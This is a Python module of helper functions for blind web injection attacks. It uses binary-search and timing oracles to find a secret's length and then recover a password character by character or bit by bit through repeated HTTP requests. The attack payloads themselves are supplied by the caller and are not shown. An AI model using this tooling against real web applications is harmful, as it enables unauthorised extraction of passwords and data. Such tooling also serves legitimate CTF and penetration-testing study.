import requests
from requests.exceptions import HTTPError
import pickle
from bs4 import BeautifulSoup
import re
import difflib
from itertools import compress
from typing import Callable
#import string
import time


def get_request(url: str, param: dict, cook={}, method='get',
                print_resp=False, print_param=True) -> str:
    try:
        response = (requests.get(url, params=param, cookies=cook)
                    if method == 'get' else
                    requests.post(url, data=param, cookies=cook))
        if print_resp:
            if method == 'get':
                print(response.url)
            print(response.text)
        response.raise_for_status()
    except HTTPError as http_err:
        print(f'HTTP error occurred: {http_err}')
    except Exception as err:
        print(f'Other error occurred: {err}')
    else:
        if print_param:
            print(param)
        return response.text


def find_error(url: str, param: str, cook: dict) -> str:
    html_responce = get_request(url, param, cook).replace(
        '<b>', '').replace('</b>', '').replace('\n', '')
    soup = BeautifulSoup(html_responce, 'html.parser')
    war = soup.find_all(string=re.compile("Warning"))
    return war


def find_key_len(url: str, payload: dict, check_func: Callable, cook={},
                 method='get', print_resp=False) -> int:
    left = -1
    right = 32
    while right > left + 1:
        middle = (left + right) // 2
        for k, v in sorted(payload.items()):
            param = {k: v % middle}
            t1 = time.time()
            response = get_request(url, param, cook, method, print_resp)
            t2 = time.time()
        if check_func(response, t1, t2):
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: dict, check_func: Callable,
                left: int, right: int,
                cook={}, method='get', print_resp=False) -> str:
    '''
    check_func: function for check success in response
    left, right: min and max ascii code of symbol
    text: str of success in response
    '''
    num_of_requests = 0
    payload_tmp = payload.copy()

    while right - left != 0:
        middle = left + (right - left) // 2 + 1
        for k, v in sorted(payload.items()):
            if '%s' in v:
                payload_tmp[k] = v % middle

        t1 = time.time()
        response = get_request(url, payload_tmp, cook, method, print_resp)
        t2 = time.time()
        num_of_requests += 1

        if check_func(response, t1, t2):
            right = middle - 1
        else:
            left = middle

    return left, num_of_requests


def find_pass_over_bits(url: str, payload: dict, len_of_key: int,
                        check_func: Callable, cook={}, unicode_len_bit=8,
                        method='get', print_resp=False) -> str:
    '''
    text: str of success in response
    unicode_len_bit: len of char in bits, 8 for ascii, 32 for utf-32 etc.
    '''
    result = ''
    num_of_requests = 0
    for j in range(1, len_of_key * 8 // unicode_len_bit + 1):

        bit = ''
        for i in range(1, unicode_len_bit + 1):
            for k, v in sorted(payload.items()):
                param = {k: v % (j, unicode_len_bit, i)}
                response = get_request(url, param, cook)
                num_of_requests += 1
            if check_func(response):
                bit += '1'
            else:
                bit += '0'

        print(bit, hex(int(bit, 2))[2:])
        uni_letter = chr(int(bit, 2))
        print(uni_letter)
        result += uni_letter

    print('num_of_requests:', num_of_requests)
    return result


def save_cookies(cooks: dict):
    try:
        with open('cooks.pickle', 'wb') as f:
            pickle.dump(cooks, f)
    except:
        print('can not write cookies')
        exit(1)
